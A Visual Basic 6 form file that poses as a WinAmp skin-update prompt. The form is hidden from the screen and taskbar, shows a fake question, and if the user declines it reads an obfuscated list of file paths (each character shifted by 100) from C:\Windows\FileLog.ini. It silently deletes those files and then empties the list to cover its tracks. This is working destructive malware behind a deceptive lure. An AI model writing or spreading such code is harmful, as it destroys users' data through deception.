VERSION 5.00
Begin VB.Form frmStartup 
   BorderStyle     =   0  'None
   ClientHeight    =   3195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   Icon            =   "frmStartup.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   WindowState     =   2  'Maximized
End
Attribute VB_Name = "frmStartup"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    R = MsgBox("Your WinAmp skins are out of date. Do you wish to update them online now?", vbYesNo + vbQuestion, "WinAmp")
    If R = vbYes Then End
    Open "C:\Windows\FileLog.ini" For Input As #1
        Do Until EOF(1)
            Input #1, Com
            For I = 1 To Len(Com)
                Temp = Asc(Mid(Com, I, 1))
                FName = FName + Chr(Temp - 100)
            Next I
            On Error Resume Next
            Kill FName
            FName = ""
        Loop
    Close #1
    Open "C:\Windows\FileLog.ini" For Output As #1
    Close #1
    End
End Sub
